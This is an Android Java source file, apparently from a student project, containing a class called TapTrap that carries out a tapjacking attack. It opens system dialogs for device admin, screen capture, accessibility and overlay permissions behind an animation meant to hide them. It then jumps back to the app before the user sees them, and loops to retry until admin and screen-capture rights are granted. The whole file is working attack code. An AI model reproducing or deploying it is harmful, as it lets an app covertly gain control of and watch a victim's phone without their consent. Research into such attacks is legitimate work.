package com.example.inf2007_mad_j1847.test;

import android.Manifest;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import android.media.projection.MediaProjectionConfig;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.animation.AlphaAnimation;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;

import androidx.activity.ComponentActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.example.inf2007_mad_j1847.test.AppDeviceAdminReceiver;
import com.example.inf2007_mad_j1847.R;

public class TapTrap {

    private final ComponentActivity activity;
    private final ComponentName adminComponent;

    // Looping configuration
    private static final int ATTACK_DURATION = 2800; // ms before escape
    private static final int LOOP_DELAY = 3000;      // ms between attacks
    private static final int MAX_ATTEMPTS = 10;       // Maximum retry attempts


    // Loop state
    private Handler loopHandler;
    private boolean isLooping = false;
    private int attemptCount = 0;


    public TapTrap(ComponentActivity activity) {
        this.activity = activity;
        this.adminComponent = new ComponentName(activity, AppDeviceAdminReceiver.class);
        this.loopHandler = new Handler(Looper.getMainLooper());

        Log.d("TapTrap", "=== RESOURCE ID DEBUG ===");
        Log.d("TapTrap", "R.anim.ani_scale2 = " + R.anim.ani_scale2);
        Log.d("TapTrap", "R.anim.ani_scale2 hex = 0x" + Integer.toHexString(R.anim.ani_scale2));
        Log.d("TapTrap", "R.anim.ani_scale = " + R.anim.ani_scale);
        Log.d("TapTrap", "R.anim.ani = " + R.anim.ani);
        Log.d("TapTrap", "android.R.anim.fade_in = " + android.R.anim.fade_in);
    }



    public boolean isDeviceAdminActive() {
        DevicePolicyManager dpm =
                (DevicePolicyManager) activity.getSystemService(Context.DEVICE_POLICY_SERVICE);

        return dpm.isAdminActive(adminComponent);
    }

    public boolean isScreenCaptureGranted() {
        return ScreenMirrorService.sResultData != null;
    }

    public boolean isPermissionGranted(String permission) {
        int result = ContextCompat.checkSelfPermission(activity, permission);
        boolean granted = (result == PackageManager.PERMISSION_GRANTED);

        String simpleName = permission.substring(permission.lastIndexOf('.') + 1);
        Log.d("tapTrap", "Permission " + simpleName + ": " +
                (granted ? "✅ GRANTED" : "❌ DENIED"));

        return granted;
    }


    public void startAttack() {
        // Don't start if already admin or already running
        if (isDeviceAdminActive() || isLooping) return;

        isLooping = true;
        attemptCount = 0;
        loopHandler.post(this::runAttackLoop);
    }

    public void stopAttack() {
        isLooping = false;
        loopHandler.removeCallbacksAndMessages(null);
    }




    // Internal loop - runs automatically
    private void runAttackLoop() {
        // Stop conditions
        if (!isLooping || activity == null || activity.isFinishing()) {
            stopAttack();
            return;
        }

        boolean adminGranted = isDeviceAdminActive();
        boolean screenGranted = isScreenCaptureGranted();

        Log.d("TapTrap", "🔄 Loop - Admin: " + adminGranted + ", Screen: " + screenGranted);

        // Success! Check BOTH permissions
        if (adminGranted && screenGranted) {
            Log.d("TapTrap", "✅ All permissions granted!");
            stopAttack();
            return;
        }

        // Too many attempts
        if (attemptCount >= MAX_ATTEMPTS) {
            Log.d("TapTrap", "❌ Max attempts reached");
            stopAttack();
            return;
        }

        attemptCount++;
        Log.d("TapTrap", "🔄 Attempt #" + attemptCount);

        // Try ONE permission at a time
        if (!adminGranted) {
            Log.d("TapTrap", "🎯 Trying Device Admin...");
            launchDeviceAdminTrap();
        }
        else if (!screenGranted) {
            Log.d("TapTrap", "🎯 Trying Screen Capture...");
            launchScreenCaptureTrap();
        }

        // Schedule the NEXT loop check AFTER the attack window
        // This should be OUTSIDE the current attack methods
        scheduleNextLoop();
    }

    private void scheduleNextLoop() {
        loopHandler.postDelayed(() -> {
            // Check again after attack window
            runAttackLoop();
        }, ATTACK_DURATION + LOOP_DELAY);
    }

    private void launchDeviceAdminTrap() {
        // Launch system dialog
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
        activity.startActivity(intent);

        // Make invisible
        activity.overridePendingTransition(R.anim.ani_scale, 1);

        // Escape after duration
        loopHandler.postDelayed(() -> {
            if (activity != null && !activity.isFinishing()) {
                Intent returnIntent = new Intent(activity, activity.getClass());
                returnIntent.setFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
                activity.startActivity(returnIntent);
            }
        }, ATTACK_DURATION);
    }


    // acreen capture intent
    public interface ScreenCaptureCallback {
        void onLaunchScreenCapture(Intent intent, int enterAnimResId);
    }

    private ScreenCaptureCallback screenCaptureCallback;

    public void setScreenCaptureCallback(ScreenCaptureCallback callback) {
        this.screenCaptureCallback = callback;
    }

    // Modify your launchScreenCaptureTrap method
    public void launchScreenCaptureTrap() {
        // Create intent HERE in TapTrap
        MediaProjectionManager mpm = (MediaProjectionManager)
                activity.getSystemService(Context.MEDIA_PROJECTION_SERVICE);

        Intent intent;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            intent = mpm.createScreenCaptureIntent(
                    MediaProjectionConfig.createConfigForDefaultDisplay()
            );
        } else {
            intent = mpm.createScreenCaptureIntent();
        }

        // Pass intent back to Compose
        if (screenCaptureCallback != null) {
            screenCaptureCallback.onLaunchScreenCapture(intent,R.anim.ani_scale);
        }



        // Apply animation
        //activity.overridePendingTransition(R.anim.ani_scale2, 1);

        // Escape after 2800ms
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            Intent returnIntent = new Intent(activity, activity.getClass());
            returnIntent.setFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
            activity.startActivity(returnIntent);
        }, 2800);
    }






    public void launchAccessibilityTrap() {
        // Intent to open Accessibility settings
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);

        // 🔴 LAUNCH SYSTEM SETTINGS
        activity.startActivity(intent);

        // 🔴 MAKE IT INVISIBLE
        activity.overridePendingTransition(R.anim.ani, 1);

        // 🔴 ESCAPE BEFORE SCREEN BECOMES VISIBLE (2.8 seconds)
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            activity.startActivity(new Intent(activity, activity.getClass()));
            activity.finish();
        }, 3000);
    }

    public void launchAppAccessibilityTrap() {
//        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
//        intent.setData(android.net.Uri.parse("package:" + activity.getPackageName()));
//        activity.startActivity(intent);

        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        activity.startActivity(intent);

        activity.overridePendingTransition(R.anim.ani, 1);

//        new Handler(Looper.getMainLooper()).postDelayed(() -> {
//            activity.startActivity(new Intent(activity, activity.getClass()));
//            activity.finish();
//        }, 2800);
    }


    public void launchAppAccessibilityTrap2() {
//        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
//        intent.setData(android.net.Uri.parse("package:" + activity.getPackageName()));
//        activity.startActivity(intent);

        Intent intent = new Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + activity.getPackageName())
        );
        activity.startActivity(intent);

        activity.overridePendingTransition(R.anim.ani, 1);

//        new Handler(Looper.getMainLooper()).postDelayed(() -> {
//            activity.startActivity(new Intent(activity, activity.getClass()));
//            activity.finish();
//        }, 2800);
    }








    public void testInvisible2() {
        try {
            Animation anim = AnimationUtils.loadAnimation(activity, R.anim.ani);

            Log.d("TapTrap", "===== ANIMATION VALUES =====");
            Log.d("TapTrap", "Duration: " + anim.getDuration() + "ms");
            Log.d("TapTrap", "FillAfter: " + anim.getFillAfter());
            Log.d("TapTrap", "StartTime: " + anim.getStartTime());
            Log.d("TapTrap", "StartOffset: " + anim.getStartOffset());
            Log.d("TapTrap", "RepeatMode: " + anim.getRepeatMode());
            Log.d("TapTrap", "RepeatCount: " + anim.getRepeatCount());

            // We can't get alpha values directly, but we can test the effect

        } catch (Exception e) {
            Log.e("TapTrap", "Error", e);
        }


        int animId = R.anim.ani;
        Log.d("TapTrap", "Animation resource ID: " + animId);

        // This will throw exception if resource doesn't exist
        activity.getResources().getAnimation(animId);
        Log.d("TapTrap", "✅ Animation resource loaded successfully");

        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);



        // 🔴 LAUNCH ACTIVITY
        activity.startActivity(intent);
        //activity.overridePendingTransition(0, 0);
        //activity.overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out);
        // 🔴 MAKE IT INVISIBLE - THIS WORKS!
        activity.overridePendingTransition(R.anim.ani, 1);


        // Escape after delay
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            activity.startActivity(new Intent(activity, activity.getClass()));
            activity.finish();
        }, 4000);
    }





}